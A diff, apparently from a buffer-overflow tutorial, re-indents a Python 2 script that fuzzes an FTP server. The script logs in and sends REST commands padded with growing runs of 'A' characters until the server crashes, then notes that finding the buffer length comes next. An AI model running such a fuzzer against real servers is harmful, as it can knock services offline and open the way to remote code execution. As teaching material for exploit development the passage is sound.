@@ -16,27 +16,27 @@ size = 100 #defining an initial buffer size
 while(size < 500): #using a while loop to keep sending the buffer until it reaches 500 bytes
     try:
       print "\nSending evil buffer with %s bytes" % size
-    	buffer ="A" * size #defining the buffer as a bunch of As
-    	s = socket(AF_INET,SOCK_STREAM)
-    	s.connect(("ip",21)) #establishing connection
-    	s.recv(2000)
-    	s.send("USER test\r\n") #sending username
-    	s.recv(2000)
-    	s.send("PASS test\r\n") #sending password
-    	s.recv(2000)
-    	s.send("REST "+ buffer +"\r\n") #sending rest and buffer
-    	s.close() #closing the connection
-    	s = socket(AF_INET,SOCK_STREAM)
-    	s.connect(("ip",21)) #an additional connection is needed for the crash to occur
-    	sleep(1) #waiting one second
-    	s.close() #closing the connection
+      buffer ="A" * size #defining the buffer as a bunch of As
+      s = socket(AF_INET,SOCK_STREAM)
+      s.connect(("ip",21)) #establishing connection
+      s.recv(2000)
+      s.send("USER test\r\n") #sending username
+      s.recv(2000)
+      s.send("PASS test\r\n") #sending password
+      s.recv(2000)
+      s.send("REST "+ buffer +"\r\n") #sending rest and buffer
+      s.close() #closing the connection
+      s = socket(AF_INET,SOCK_STREAM)
+      s.connect(("ip",21)) #an additional connection is needed for the crash to occur
+      sleep(1) #waiting one second
+      s.close() #closing the connection
 
       size +=100 #increasing the buffer size by 100
       sleep(10) #waiting 10 seconds before repeating the loop
 
     except: #if a connection can't be made, print an error and exit cleanly
-    	print "[*]Error in connection with server"
-    	sys.exit()
+      print "[*]Error in connection with server"
+      sys.exit()
 
 From this point we need to know which length of input buffer we must have.
 
